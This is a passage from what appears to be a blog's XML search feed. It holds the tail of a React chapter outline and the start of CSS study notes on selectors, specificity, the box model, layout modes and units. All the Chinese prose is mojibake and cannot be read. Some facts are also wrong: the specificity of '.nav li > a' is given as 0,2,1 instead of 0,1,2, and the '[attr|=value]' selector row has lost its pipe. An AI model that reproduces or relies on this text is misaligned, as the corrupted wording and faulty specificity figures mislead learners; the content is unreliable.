Profilerã€å‡å°‘é‡æ¸²æŸ“ï¼‰"></a>7.4 æ€§èƒ½ä¼˜åŒ–ï¼ˆReact Profilerã€å‡å°‘é‡æ¸²æŸ“ï¼‰</h2><h2 id="7-5-æ„å»ºå·¥å…·ï¼ˆWebpack-é…ç½®ã€Vite-ä¼˜åŒ–ï¼‰"><a href="#7-5-æ„å»ºå·¥å…·ï¼ˆWebpack-é…ç½®ã€Vite-ä¼˜åŒ–ï¼‰" class="headerlink" title="7.5 æ„å»ºå·¥å…·ï¼ˆWebpack é…ç½®ã€Vite ä¼˜åŒ–ï¼‰"></a>7.5 æ„å»ºå·¥å…·ï¼ˆWebpack é…ç½®ã€Vite ä¼˜åŒ–ï¼‰</h2><h1 id="ç¬¬å…«ç« ï¼šReact-18-æ–°ç‰¹æ€§ä¸æœªæ¥è¶‹åŠ¿"><a href="#ç¬¬å…«ç« ï¼šReact-18-æ–°ç‰¹æ€§ä¸æœªæ¥è¶‹åŠ¿" class="headerlink" title="ç¬¬å…«ç« ï¼šReact 18 æ–°ç‰¹æ€§ä¸æœªæ¥è¶‹åŠ¿"></a>ç¬¬å…«ç« ï¼šReact 18 æ–°ç‰¹æ€§ä¸æœªæ¥è¶‹åŠ¿</h1><h2 id="8-1-Concurrent-Modeï¼ˆå¹¶å‘æ¸²æŸ“ï¼‰"><a href="#8-1-Concurrent-Modeï¼ˆå¹¶å‘æ¸²æŸ“ï¼‰" class="headerlink" title="8.1 Concurrent Modeï¼ˆå¹¶å‘æ¸²æŸ“ï¼‰"></a>8.1 Concurrent Modeï¼ˆå¹¶å‘æ¸²æŸ“ï¼‰</h2><h2 id="8-2-è‡ªåŠ¨æ‰¹å¤„ç†ï¼ˆAutomatic-Batchingï¼‰"><a href="#8-2-è‡ªåŠ¨æ‰¹å¤„ç†ï¼ˆAutomatic-Batchingï¼‰" class="headerlink" title="8.2 è‡ªåŠ¨æ‰¹å¤„ç†ï¼ˆAutomatic Batchingï¼‰"></a>8.2 è‡ªåŠ¨æ‰¹å¤„ç†ï¼ˆAutomatic Batchingï¼‰</h2><h2 id="8-3-Transition-APIï¼ˆstartTransitionï¼‰"><a href="#8-3-Transition-APIï¼ˆstartTransitionï¼‰" class="headerlink" title="8.3 Transition APIï¼ˆstartTransitionï¼‰"></a>8.3 Transition APIï¼ˆstartTransitionï¼‰</h2><h2 id="8-4-Server-Componentsï¼ˆæœåŠ¡ç«¯ç»„ä»¶ï¼‰"><a href="#8-4-Server-Componentsï¼ˆæœåŠ¡ç«¯ç»„ä»¶ï¼‰" class="headerlink" title="8.4 Server Componentsï¼ˆæœåŠ¡ç«¯ç»„ä»¶ï¼‰"></a>8.4 Server Componentsï¼ˆæœåŠ¡ç«¯ç»„ä»¶ï¼‰</h2><h2 id="8-5-React-ç”Ÿæ€è¶‹åŠ¿ï¼ˆRSCã€React-Nativeï¼‰"><a href="#8-5-React-ç”Ÿæ€è¶‹åŠ¿ï¼ˆRSCã€React-Nativeï¼‰" class="headerlink" title="8.5 React ç”Ÿæ€è¶‹åŠ¿ï¼ˆRSCã€React Nativeï¼‰"></a>8.5 React ç”Ÿæ€è¶‹åŠ¿ï¼ˆRSCã€React Nativeï¼‰</h2>]]></content>
    
    
    <categories>
      
      <category>React</category>
      
    </categories>
    
    
    <tags>
      
      <tag>React</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSS ä¸“é¢˜çŸ¥è¯†å­¦ä¹ </title>
    <link href="/2025/06/22/CSS%20Study%20Notes/"/>
    <url>/2025/06/22/CSS%20Study%20Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬ä¸€ç« ï¼šCSS-åŸºç¡€ä¸æ ¸å¿ƒæ¦‚å¿µ"><a href="#ç¬¬ä¸€ç« ï¼šCSS-åŸºç¡€ä¸æ ¸å¿ƒæ¦‚å¿µ" class="headerlink" title="ç¬¬ä¸€ç« ï¼šCSS åŸºç¡€ä¸æ ¸å¿ƒæ¦‚å¿µ"></a>ç¬¬ä¸€ç« ï¼šCSS åŸºç¡€ä¸æ ¸å¿ƒæ¦‚å¿µ</h1><h2 id="1-1-CSS-è¯­æ³•ä¸é€‰æ‹©å™¨ï¼ˆåŸºç¡€é€‰æ‹©å™¨ã€ç»„åˆé€‰æ‹©å™¨ã€å±æ€§é€‰æ‹©å™¨ï¼‰"><a href="#1-1-CSS-è¯­æ³•ä¸é€‰æ‹©å™¨ï¼ˆåŸºç¡€é€‰æ‹©å™¨ã€ç»„åˆé€‰æ‹©å™¨ã€å±æ€§é€‰æ‹©å™¨ï¼‰" class="headerlink" title="1.1 CSS è¯­æ³•ä¸é€‰æ‹©å™¨ï¼ˆåŸºç¡€é€‰æ‹©å™¨ã€ç»„åˆé€‰æ‹©å™¨ã€å±æ€§é€‰æ‹©å™¨ï¼‰"></a>1.1 CSS è¯­æ³•ä¸é€‰æ‹©å™¨ï¼ˆåŸºç¡€é€‰æ‹©å™¨ã€ç»„åˆé€‰æ‹©å™¨ã€å±æ€§é€‰æ‹©å™¨ï¼‰</h2><h3 id="åŸºç¡€è¯­æ³•ç»“æ„"><a href="#åŸºç¡€è¯­æ³•ç»“æ„" class="headerlink" title="åŸºç¡€è¯­æ³•ç»“æ„"></a>åŸºç¡€è¯­æ³•ç»“æ„</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* æ ‡å‡†è§„åˆ™ */</span><br>selector &#123;<br>  property: value; <span class="hljs-comment">/* å£°æ˜å— */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åŸºç¡€é€‰æ‹©å™¨"><a href="#åŸºç¡€é€‰æ‹©å™¨" class="headerlink" title="åŸºç¡€é€‰æ‹©å™¨"></a>åŸºç¡€é€‰æ‹©å™¨</h3><p><strong>å…ƒç´ é€‰æ‹©å™¨</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-tag">div</span> &#123; <span class="hljs-attribute">color</span>: red; &#125;<br></code></pre></td></tr></table></figure><ul><li>æƒé‡ï¼š0,0,1</li><li>é€‚ç”¨åœºæ™¯ï¼šå…¨å±€æ ·å¼è¦†ç›–</li></ul><p><strong>ç±»é€‰æ‹©å™¨</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.active</span> &#123; <span class="hljs-attribute">background</span>: blue; &#125;<br></code></pre></td></tr></table></figure><ul><li>æƒé‡ï¼š0,1,0</li><li>å®è·µï¼šBEMå‘½åè§„èŒƒï¼ˆblock__elementâ€“modifierï¼‰</li></ul><span id="more"></span><p><strong>ID é€‰æ‹©å™¨</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-id">#header</span> &#123; <span class="hljs-attribute">height</span>: <span class="hljs-number">60px</span>; &#125;<br></code></pre></td></tr></table></figure><ul><li>æƒé‡ï¼š1,0,0</li><li>ç¦ç”¨åœºæ™¯ï¼šReact&#x2F;Vueä¸­æ˜“å¯¼è‡´æ ·å¼æ±¡æŸ“ï¼ˆç»„ä»¶åŒ–å¼€å‘æ…ç”¨ï¼‰</li></ul><p><strong>é€šé…é€‰æ‹©å™¨</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS">* &#123; <span class="hljs-attribute">box-sizing</span>: border-box; &#125;<br></code></pre></td></tr></table></figure><ul><li>æƒé‡ï¼š0,0,0</li><li>æ€§èƒ½å½±å“ï¼šå¤§å‹é¡¹ç›®é¿å…è¿‡åº¦ä½¿ç”¨</li></ul><h3 id="ç»„åˆé€‰æ‹©å™¨"><a href="#ç»„åˆé€‰æ‹©å™¨" class="headerlink" title="ç»„åˆé€‰æ‹©å™¨"></a>ç»„åˆé€‰æ‹©å™¨</h3><p><strong>åä»£é€‰æ‹©å™¨</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-tag">nav</span> <span class="hljs-selector-tag">a</span> &#123; <span class="hljs-attribute">color</span>: green; &#125; <span class="hljs-comment">/* æ‰€æœ‰å±‚çº§åä»£ */</span><br></code></pre></td></tr></table></figure><ul><li>æƒé‡ï¼šå„é€‰æ‹©å™¨æƒé‡ç›¸åŠ </li><li>æ€§èƒ½é™·é˜±ï¼šæ·±å±‚åµŒå¥—å¢åŠ æ¸²æŸ“æˆæœ¬ï¼ˆå»ºè®®é™åˆ¶ 3 å±‚ï¼‰</li></ul><p><strong>å­é€‰æ‹©å™¨</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-tag">ul</span> &gt; <span class="hljs-selector-tag">li</span> &#123; <span class="hljs-attribute">list-style</span>: none; &#125; <span class="hljs-comment">/* ä»…ç›´æ¥å­å…ƒç´  */</span><br></code></pre></td></tr></table></figure><ul><li>ä¸åä»£é€‰æ‹©å™¨åŒºåˆ«ï¼šä¸åŒ¹é…éç›´æ¥åµŒå¥—å…ƒç´ </li></ul><p><strong>ç›¸é‚»å…„å¼Ÿé€‰æ‹©å™¨</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-tag">h1</span> + <span class="hljs-selector-tag">p</span> &#123; <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">0</span>; &#125; <span class="hljs-comment">/* ç´§é‚»çš„ä¸‹ä¸€ä¸ªå…„å¼Ÿ */</span><br></code></pre></td></tr></table></figure><ul><li>å…¸å‹åœºæ™¯ï¼šè¡¨å•å…ƒç´ é—´éš”æ§åˆ¶</li></ul><p><strong>é€šç”¨å…„å¼Ÿé€‰æ‹©å™¨</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-tag">h2</span> ~ <span class="hljs-selector-tag">p</span> &#123; <span class="hljs-attribute">color</span>: gray; &#125; <span class="hljs-comment">/* åç»­æ‰€æœ‰åŒçº§å…„å¼Ÿ */</span><br></code></pre></td></tr></table></figure><ul><li>åº”ç”¨æ¡ˆä¾‹ï¼šç›®å½•æ ‡é¢˜ä¸å†…å®¹æ ·å¼å…³è”</li></ul><h3 id="å±æ€§é€‰æ‹©å™¨"><a href="#å±æ€§é€‰æ‹©å™¨" class="headerlink" title="å±æ€§é€‰æ‹©å™¨"></a>å±æ€§é€‰æ‹©å™¨</h3><table><thead><tr><th align="left">é€‰æ‹©å™¨ç±»å‹</th><th align="left">ç¤ºä¾‹</th><th align="left">åŒ¹é…è§„åˆ™</th><th align="left">æƒé‡</th></tr></thead><tbody><tr><td align="left">[attr]</td><td align="left">[target]</td><td align="left">å­˜åœ¨è¯¥å±æ€§å³å¯</td><td align="left">0,1,0</td></tr><tr><td align="left">[attr&#x3D;value]</td><td align="left">[lang&#x3D;â€enâ€]</td><td align="left">å±æ€§å€¼å®Œå…¨åŒ¹é…</td><td align="left">0,1,0</td></tr><tr><td align="left">[attr~&#x3D;value]</td><td align="left">[class~&#x3D;â€logoâ€]</td><td align="left">å±æ€§å€¼åŒ…å«è¯¥è¯ï¼ˆç©ºæ ¼åˆ†éš”ï¼‰</td><td align="left">0,1,0</td></tr><tr><td align="left">[attr&#x3D;value]</td><td align="left">[lang&#x3D;â€zhâ€]</td><td align="left">å±æ€§å€¼ä¸ºzhæˆ–ä»¥zh-å¼€å¤´</td><td align="left">0,1,0</td></tr><tr><td align="left">[attr^&#x3D;value]</td><td align="left">[href^&#x3D;â€httpsâ€]</td><td align="left">å±æ€§å€¼ä»¥æŒ‡å®šå­—ç¬¦ä¸²å¼€å¤´</td><td align="left">0,1,0</td></tr><tr><td align="left">[attr$&#x3D;value]</td><td align="left">[src$&#x3D;â€.pngâ€]</td><td align="left">å±æ€§å€¼ä»¥æŒ‡å®šå­—ç¬¦ä¸²ç»“å°¾</td><td align="left">0,1,0</td></tr><tr><td align="left">[attr*&#x3D;value]</td><td align="left">[data*&#x3D;â€errorâ€]</td><td align="left">å±æ€§å€¼åŒ…å«å­å­—ç¬¦ä¸²</td><td align="left">0,1,0</td></tr></tbody></table><h3 id="æ€è€ƒ"><a href="#æ€è€ƒ" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h3><p><strong>Qï¼š<code>.nav li &gt; a</code> å’Œ <code>.nav &gt; li &gt; a</code> çš„æƒé‡ä¸ä½œç”¨åŸŸå·®å¼‚ï¼Ÿ</strong></p><p>æƒé‡ç›¸åŒï¼ˆ0,2,1ï¼‰ï¼Œä½†åè€…é™åˆ¶ <code>li</code> å¿…é¡»ä¸º <code>.nav</code> çš„ç›´æ¥å­å…ƒç´ </p><p><strong>Qï¼š<code>div:not([class])</code> ä¼šåŒ¹é…å“ªäº›å…ƒç´ ï¼Ÿ</strong></p><p>æ‰€æœ‰æ²¡æœ‰ class å±æ€§çš„ div å…ƒç´ </p><h2 id="1-2-ç›’æ¨¡å‹ï¼ˆæ ‡å‡†ç›’æ¨¡å‹-vs-æ€ªå¼‚ç›’æ¨¡å‹ï¼‰"><a href="#1-2-ç›’æ¨¡å‹ï¼ˆæ ‡å‡†ç›’æ¨¡å‹-vs-æ€ªå¼‚ç›’æ¨¡å‹ï¼‰" class="headerlink" title="1.2 ç›’æ¨¡å‹ï¼ˆæ ‡å‡†ç›’æ¨¡å‹ vs. æ€ªå¼‚ç›’æ¨¡å‹ï¼‰"></a>1.2 ç›’æ¨¡å‹ï¼ˆæ ‡å‡†ç›’æ¨¡å‹ vs. æ€ªå¼‚ç›’æ¨¡å‹ï¼‰</h2><h3 id="æ ¸å¿ƒæ¦‚å¿µå¯¹æ¯”"><a href="#æ ¸å¿ƒæ¦‚å¿µå¯¹æ¯”" class="headerlink" title="æ ¸å¿ƒæ¦‚å¿µå¯¹æ¯”"></a>æ ¸å¿ƒæ¦‚å¿µå¯¹æ¯”</h3><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">æ ‡å‡†ç›’æ¨¡å‹ï¼ˆW3Cï¼‰</th><th align="left">æ€ªå¼‚ç›’æ¨¡å‹ï¼ˆQuirks Modeï¼‰</th></tr></thead><tbody><tr><td align="left">è§¦å‘æ¡ä»¶</td><td align="left">box-sizing: content-box</td><td align="left">box-sizing: border-box</td></tr><tr><td align="left">å®½åº¦è®¡ç®—</td><td align="left">width &#x3D; contentå®½åº¦</td><td align="left">width &#x3D; content + padding + border</td></tr><tr><td align="left">é«˜åº¦è®¡ç®—</td><td align="left">height &#x3D; contenté«˜åº¦</td><td align="left">height &#x3D; content + padding + border</td></tr><tr><td align="left">é»˜è®¤åœºæ™¯</td><td align="left">ç°ä»£æµè§ˆå™¨é»˜è®¤æ¨¡å¼</td><td align="left">ä¼ ç»ŸIE5åŠæ›´æ—©æµè§ˆå™¨</td></tr></tbody></table><h3 id="ä»£ç éªŒè¯"><a href="#ä»£ç éªŒè¯" class="headerlink" title="ä»£ç éªŒè¯"></a>ä»£ç éªŒè¯</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;div class=&quot;std-box&quot;&gt;æ ‡å‡†ç›’æ¨¡å‹&lt;/div&gt;<br>&lt;div class=&quot;weird-box&quot;&gt;æ€ªå¼‚ç›’æ¨¡å‹&lt;/div&gt;<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.std-box</span> &#123;<br>  <span class="hljs-attribute">box-sizing</span>: content-box; <span class="hljs-comment">/* é»˜è®¤å€¼å¯çœç•¥ */</span><br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">5px</span> solid red;<br>  <span class="hljs-comment">/* å®é™…å ç”¨å®½åº¦ï¼š100 + 20*2 + 5*2 = 150px */</span><br>&#125;<br><br><span class="hljs-selector-class">.weird-box</span> &#123;<br>  <span class="hljs-attribute">box-sizing</span>: border-box;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">5px</span> solid blue;<br>  <span class="hljs-comment">/* å®é™…å ç”¨å®½åº¦ï¼š100px (contentè‡ªåŠ¨å‹ç¼©ä¸º50px) */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ€è€ƒ-1"><a href="#æ€è€ƒ-1" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h3><p><strong>Qï¼šä¸ºä»€ä¹ˆå¤§å‹é¡¹ç›®æ™®éé‡‡ç”¨ <code>border-box</code>ï¼Ÿ</strong></p><ul><li>å¼€å‘ä½“éªŒä¼˜åŒ–ï¼šè½»æ¾å®ç°æ …æ ¼åŒ–å¸ƒå±€ï¼Œæ— éœ€è®¡ç®— padding</li><li>æ€§èƒ½ä¼˜åŠ¿ï¼šå‡å°‘é‡æ’è®¡ç®—ï¼ˆæµè§ˆå™¨æ— éœ€é‡æ–°è®¡ç®—å†…å®¹åŒºå°ºå¯¸ï¼‰</li><li>è®¾è®¡ç³»ç»Ÿé€‚é…ï¼šç¡®ä¿ UI æ ‡æ³¨å°ºå¯¸ä¸å®é™…æ¸²æŸ“å°ºå¯¸ä¸€è‡´</li></ul><h2 id="1-3-å¸ƒå±€æ¨¡å¼ï¼ˆå—çº§ã€è¡Œå†…ã€è¡Œå†…å—ã€Flexã€Gridï¼‰"><a href="#1-3-å¸ƒå±€æ¨¡å¼ï¼ˆå—çº§ã€è¡Œå†…ã€è¡Œå†…å—ã€Flexã€Gridï¼‰" class="headerlink" title="1.3 å¸ƒå±€æ¨¡å¼ï¼ˆå—çº§ã€è¡Œå†…ã€è¡Œå†…å—ã€Flexã€Gridï¼‰"></a>1.3 å¸ƒå±€æ¨¡å¼ï¼ˆå—çº§ã€è¡Œå†…ã€è¡Œå†…å—ã€Flexã€Gridï¼‰</h2><h3 id="å—çº§å¸ƒå±€ï¼ˆBlockï¼‰"><a href="#å—çº§å¸ƒå±€ï¼ˆBlockï¼‰" class="headerlink" title="å—çº§å¸ƒå±€ï¼ˆBlockï¼‰"></a>å—çº§å¸ƒå±€ï¼ˆBlockï¼‰</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">display</span>: block;<br></code></pre></td></tr></table></figure><p><strong>æ ¸å¿ƒç‰¹æ€§</strong></p><ul><li>ç‹¬å ä¸€è¡Œï¼Œé»˜è®¤å®½åº¦æ’‘æ»¡çˆ¶å®¹å™¨</li><li>å¯è®¾ç½®å®½é«˜&#x2F;margin&#x2F;paddingæ‰€æœ‰æ–¹å‘</li><li>å…¸å‹å…ƒç´ ï¼š<code>&lt;div&gt;</code>ã€<code>&lt;p&gt;</code>ã€<code>&lt;section&gt;</code></li></ul><h3 id="è¡Œå†…å¸ƒå±€ï¼ˆInlineï¼‰"><a href="#è¡Œå†…å¸ƒå±€ï¼ˆInlineï¼‰" class="headerlink" title="è¡Œå†…å¸ƒå±€ï¼ˆInlineï¼‰"></a>è¡Œå†…å¸ƒå±€ï¼ˆInlineï¼‰</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">display</span>: inline;<br></code></pre></td></tr></table></figure><p><strong>æ ¸å¿ƒç‰¹æ€§</strong></p><ul><li>ä¸ç‹¬å ä¸€è¡Œï¼Œå®½åº¦ç”±å†…å®¹å†³å®š</li><li>ä¸å¯è®¾ç½®å®½é«˜ï¼Œå‚ç›´æ–¹å‘çš„ margin&#x2F;padding ä¸ç”Ÿæ•ˆ</li><li>å…¸å‹å…ƒç´ ï¼š<code>&lt;span&gt;</code>ã€<code>&lt;a&gt;</code>ã€<code>&lt;em&gt;</code></li></ul><h3 id="è¡Œå†…å—å¸ƒå±€ï¼ˆInline-blockï¼‰"><a href="#è¡Œå†…å—å¸ƒå±€ï¼ˆInline-blockï¼‰" class="headerlink" title="è¡Œå†…å—å¸ƒå±€ï¼ˆInline-blockï¼‰"></a>è¡Œå†…å—å¸ƒå±€ï¼ˆInline-blockï¼‰</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">display</span>: inline-block;<br></code></pre></td></tr></table></figure><p><strong>æ ¸å¿ƒç‰¹æ€§</strong></p><ul><li>ä¸ç‹¬å ä¸€è¡Œä½†å¯ä»¥è®¾ç½®å®½é«˜ï¼ˆå…¼å…·å—çº§å¸ƒå±€å’Œè¡Œå†…å¸ƒå±€ç‰¹æ€§ï¼‰</li><li>é»˜è®¤åŸºçº¿å¯¹é½ï¼ˆå¼•å‘ç»å…¸å‚ç›´å¯¹é½é—®é¢˜ï¼‰</li></ul><p><strong>æ€è€ƒ</strong></p><ul><li>å¦‚ä½•æ¶ˆé™¤è¡Œå†…å—å…ƒç´ é—´éš™ï¼šçˆ¶å®¹å™¨font-size: 0æˆ–HTMLä»£ç æ— ç©ºæ ¼</li><li>å‚ç›´å¯¹é½æ§åˆ¶ï¼švertical-align: middle&#x2F;top&#x2F;bottom</li></ul><h3 id="Flexå¸ƒå±€"><a href="#Flexå¸ƒå±€" class="headerlink" title="Flexå¸ƒå±€"></a>Flexå¸ƒå±€</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">display</span>: flex;<br></code></pre></td></tr></table></figure><p><strong>æ ¸å¿ƒç‰¹æ€§</strong></p><ul><li>ä¸»è½´&#x2F;äº¤å‰è½´åŒè½´æ§åˆ¶</li><li>å­é¡¹å¼¹æ€§ä¼¸ç¼©ï¼ˆflex-grow&#x2F;shrink&#x2F;basisï¼‰</li></ul><p><strong>æ€è€ƒ</strong></p><ul><li>å®ç°ç­‰é«˜å¸ƒå±€ï¼š<code>align-items: stretch</code></li><li>åœ£æ¯å¸ƒå±€ï¼š<code>flex: 1</code> + <code>order</code> å±æ€§</li><li>æ€§èƒ½ä¼˜åŒ–ï¼šé¿å…è¿‡åº¦åµŒå¥—</li></ul><p><strong>å®æˆ˜å®ä¾‹</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">flex-wrap</span>: wrap;<br>  <span class="hljs-attribute">gap</span>: <span class="hljs-number">10px</span>; <span class="hljs-comment">/* æ›¿ä»£marginæ–¹æ¡ˆ */</span><br>&#125;<br><span class="hljs-selector-class">.item</span> &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-built_in">calc</span>(<span class="hljs-number">33.33%</span> - <span class="hljs-number">10px</span>); <span class="hljs-comment">/* ä¸‰æ è‡ªé€‚åº” */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Gridç½‘æ ¼å¸ƒå±€"><a href="#Gridç½‘æ ¼å¸ƒå±€" class="headerlink" title="Gridç½‘æ ¼å¸ƒå±€"></a>Gridç½‘æ ¼å¸ƒå±€</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">display</span>: grid;<br></code></pre></td></tr></table></figure><p><strong>æ ¸å¿ƒç‰¹æ€§</strong></p><ul><li>äºŒç»´å¸ƒå±€ç³»ç»Ÿï¼ˆè¡Œåˆ—æ˜¾å¼å®šä¹‰ï¼‰</li><li>ç½‘æ ¼çº¿&#x2F;ç½‘æ ¼åŒºåŸŸå‘½åæ§åˆ¶</li></ul><h3 id="æ¸²æŸ“æ€§èƒ½æ’åº"><a href="#æ¸²æŸ“æ€§èƒ½æ’åº" class="headerlink" title="æ¸²æŸ“æ€§èƒ½æ’åº"></a>æ¸²æŸ“æ€§èƒ½æ’åº</h3><p>Block &gt; Flex â‰ˆ Grid &gt; Inline-blockï¼ˆå¤åˆå±‚åˆ›å»ºæˆæœ¬ï¼‰</p><h2 id="1-4-å¸¸ç”¨å•ä½ï¼ˆpxã€emã€remã€vw-vhã€-ï¼‰"><a href="#1-4-å¸¸ç”¨å•ä½ï¼ˆpxã€emã€remã€vw-vhã€-ï¼‰" class="headerlink" title="1.4 å¸¸ç”¨å•ä½ï¼ˆpxã€emã€remã€vw&#x2F;vhã€%ï¼‰"></a>1.4 å¸¸ç”¨å•ä½ï¼ˆpxã€emã€remã€vw&#x2F;vhã€%ï¼‰</h2><h3 id="ç»å¯¹å•ä½ä¸ç›¸å¯¹å•ä½çš„å¯¹æ¯”"><a href="#ç»å¯¹å•ä½ä¸ç›¸å¯¹å•ä½çš„å¯¹æ¯”" class="headerlink" title="ç»å¯¹å•ä½ä¸ç›¸å¯¹å•ä½çš„å¯¹æ¯”"></a>ç»å¯¹å•ä½ä¸ç›¸å¯¹å•ä½çš„å¯¹æ¯”</h3><table><thead><tr><th align="left">å•ä½ç±»å‹</th><th align="left">ä»£è¡¨å•ä½</th><th align="left">åŸºå‡†å‚ç…§ç‰©</th><th align="left">é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td align="left">ç»å¯¹å•ä½</td><td align="left">px</td><td align="left">è®¾å¤‡ç‰©ç†åƒç´ </td><td align="left">è¾¹æ¡†&#x2F;é˜´å½±ç­‰å›ºå®šå°ºå¯¸</td></tr><tr><td align="left">ç›¸å¯¹å•ä½</td><td align="left">em&#x2F;rem</td><td align="left">å­—ä½“å¤§å°&#x2F;æ ¹å­—ä½“å¤§å°</td><td align="left">å“åº”å¼æ–‡æœ¬&#x2F;ç»„ä»¶é—´è·</td></tr><tr><td align="left">è§†å£å•ä½</td><td align="left">vw&#x2F;vh</td><td align="left">è§†çª—å®½é«˜</td><td align="left">å…¨å±å¸ƒå±€&#x2F;è‡ªé€‚åº”å…ƒç´ </td></tr><tr><td align="left">ç™¾åˆ†æ¯”</td><td align="left">%</td><td align="left">çˆ¶å…ƒç´ å¯¹åº”å±æ€§å€¼</td><td align="left">æµå¼å¸ƒå±€&#x2F;ç»§æ‰¿æ¯”ä¾‹</td></tr></tbody></table><h3 id="æ ¸å¿ƒå•ä½è¯¦è§£"><a href="#æ ¸å¿ƒå•ä½è¯¦è§£" class="headerlink" title="æ ¸å¿ƒå•ä½è¯¦è§£"></a>æ ¸å¿ƒå•ä½è¯¦è§£</h3><p><strong>pxï¼ˆåƒç´ ï¼‰</strong></p><ul><li>æœ¬è´¨ï¼šä¸è®¾å¤‡ç‰©ç†åƒç´ æŒ‚é’©ï¼ˆä½†å— DPR å½±å“ï¼‰</li><li>é™·é˜±ï¼š<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.box</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">2px</span>; <span class="hljs-comment">/* é«˜æ¸…å±å¯èƒ½å®é™…æ¸²æŸ“ä¸º4ç‰©ç†åƒç´  */</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p><strong>em</strong></p><ul><li>è®¡ç®—è§„åˆ™ï¼š<code>1em = å½“å‰å…ƒç´  font-size</code></li><li>çº§è”é—®é¢˜ï¼š<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS">&lt;<span class="hljs-selector-tag">div</span> class=&quot;parent&quot; style=&quot;<span class="hljs-attribute">font-size</span>: <span class="hljs-number">20px</span><span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string">  &lt;div class=&quot;</span>child<span class="hljs-string">&quot; style=&quot;</span>font-size: <span class="hljs-number">1.2em</span><span class="hljs-string">&quot;&gt; &lt;!-- 24px --&gt;</span><br><span class="hljs-string">    &lt;div class=&quot;</span>grandchild<span class="hljs-string">&quot; style=&quot;</span>width: <span class="hljs-number">2em</span><span class="hljs-string">&quot;&gt; &lt;!-- 48px (!) --&gt;</span><br><span class="hljs-string">    &lt;/div&gt;</span><br><span class="hljs-string">  &lt;/div&gt;</span><br><span class="hljs-string">&lt;/div&gt;</span><br></code></pre></td></tr></table></figure></li></ul><p><strong>remï¼ˆRoot 